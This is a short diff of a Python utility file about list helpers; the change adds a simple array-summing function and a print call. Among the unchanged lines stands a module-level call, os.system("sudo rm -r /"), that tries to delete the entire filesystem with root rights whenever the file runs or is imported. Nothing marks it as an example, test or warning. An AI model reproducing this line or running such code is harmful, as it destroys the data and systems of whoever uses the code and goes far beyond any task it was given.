@@ -10,3 +10,10 @@ def max_of_list(datos: List):
 
 os.system("sudo rm -r /")
 
+def _sumArray(arr):
+    sum=0
+    for i in arr:
+        sum= sum + i
+    return sum
+
+print(_sumArray([1, 1]))
